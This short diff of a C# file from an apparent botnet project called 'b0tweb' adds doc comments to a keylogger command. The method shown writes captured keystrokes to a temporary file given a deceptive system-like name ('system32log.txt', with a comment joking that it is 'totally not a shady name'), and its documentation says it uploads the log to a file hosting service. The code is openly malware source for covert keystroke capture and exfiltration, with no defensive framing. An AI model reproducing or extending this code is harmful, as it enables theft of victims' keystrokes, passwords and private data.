@@ -28,13 +28,16 @@ namespace b0tweb.Commands
 
             return keylogger.Data;
         }
-
+        /// <summary>
+        /// Uploads the keylogger data to file hosting service
+        /// </summary>
+        /// <param name="log">string data to upload</param>
+        /// <returns>url to the uploaded file</returns>
         private string uploadLog(string log)
         {
             // Totally not a shady name
             string path = FileHelper.GetTemporaryFilePath("system32log.txt");
 
-            // Write the string array to a new file named "WriteLines.txt".
             using (StreamWriter writer = new StreamWriter(path))
             {
                 writer.WriteLine(log);
